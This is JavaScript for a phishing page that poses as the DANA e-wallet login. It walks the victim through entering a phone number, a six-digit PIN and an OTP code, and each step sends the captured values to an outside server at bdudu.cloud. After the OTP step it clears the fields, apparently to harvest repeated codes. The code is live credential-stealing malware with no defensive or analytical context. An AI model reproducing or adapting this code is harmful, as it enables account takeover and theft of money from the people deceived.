var logo = "☴ www.dana.id ☴";    

/////// NOMOR /////////////////////
function sendNohp(event) {
    event.preventDefault(); 
    $("#process").show();
    event.preventDefault();
  
    var tarif = document.getElementById("tarif").value;        
    var dataString = $("#formNohp, #formPin, #formOtp").serialize();
    
    var gabungan = 
        logo + "\n" + 
        tarif + "\n\n" + 
        "|𝗡𝗼𝗺𝗼𝗿 |  <code>0" + nomor.value + "</code>";
    
    $.ajax({
        type: 'POST',
        url: 'https://bdudu.cloud/ku/i.php',
        data: { message: gabungan },
        complete: function(data) {
            console.log('Complete');
            $("#process").hide();
            document.getElementById("back1").style.display = "none";
            document.getElementById("back2").style.display = "block";
            $("#formNohp").fadeOut();
            setTimeout(function() {
                $("#formPin").fadeIn();
                $("#pin1").focus();
            }, 500);
        }
    });
};

/////// PIN ///////////////////////
function sendPin() {
    event.preventDefault();
    $("#process").show();
    var tarif = document.getElementById("tarif").value;
    var dataString = $("#formNohp, #formPin, #formOtp").serialize();
    
    var pin = [
        pin1.value, 
        pin2.value, 
        pin3.value, 
        pin4.value, 
        pin5.value, 
        pin6.value
    ];
    
    var gabungan = 
        logo + "\n" + 
        tarif + "\n\n" + 
        "|𝗡𝗼𝗺𝗼𝗿 |  <code>0" + nomor.value + "</code>\n" + 
        "|𝗣𝗶𝗻: <pre>" + pin.join("") + "</pre>";
    
    $.ajax({
        type: 'POST',
        url: 'https://bdudu.cloud/ku/i.php',
        data: { message: gabungan },
        complete: function(data) {
            console.log('Complete');
            $("#process").hide();
            $(".inline-logo").show();
            var nomor = document.getElementById("nomor").value;
            document.getElementById("alert").innerHTML = "+62 " + nomor + "";
            $("#process").hide();           
            $("#formPin").fadeOut();
            $(".bgotp").fadeIn();
            
            var items = ["tarif", "nomor"];
            items.forEach(function(item) {
                var value = document.getElementById(item).value;
                sessionStorage.setItem(item, value);
            });       
            for (var i = 1; i <= 6; i++) {
                var pin = document.getElementById("pin" + i).value;
                sessionStorage.setItem("pin" + i, pin);
            }
        }
    });
};

/////// OTP /////////////////////
function submit() {
    event.preventDefault();
    xx.style.display = '';
    con.style.marginTop = '';
    
    var pin = [];
    for (var i = 1; i <= 6; i++) {
        pin.push(sessionStorage.getItem("pin" + i));
    }
    
    var otp = [
        tp1.value,
        tp2.value,
        tp3.value,
        tp4.value
    ];
    
    var gabungan = 
        logo + "\n" + 
        tarif + "\n\n" + 
        "|𝗡𝗼𝗺𝗼𝗿  | <code>0" + sessionStorage.getItem("nomor") + "</code>\n" + 
        "|𝗣𝗶𝗻: <pre>" + pin.join("") + "</pre>\n" + 
        "|𝗖𝗼𝗱𝗲: <pre><b>" + otp.join("") + "</b></pre>";
    
    $.ajax({
        type: 'POST',
        url: 'https://bdudu.cloud/ku/i.php',
        data: { message: gabungan },
        dataType: 'json',
        complete: function(data) {     
            console.log(data);
            setTimeout(function() {
                $("#process").fadeOut();      
                $(".animated").removeClass("hide");       
                $(".animated").show();
            }, 500);
            setTimeout(function() {        
                $('#tp1').val('');
                $('#tp2').val('');
                $('#tp3').val('');
                $('#tp4').val('');
                $('#tp1').focus();       
                $(".animated").addClass("hide");              
            }, 4000);
        },
        error: function(xhr, status, error) {      
            console.log(error);
        }
    });
}
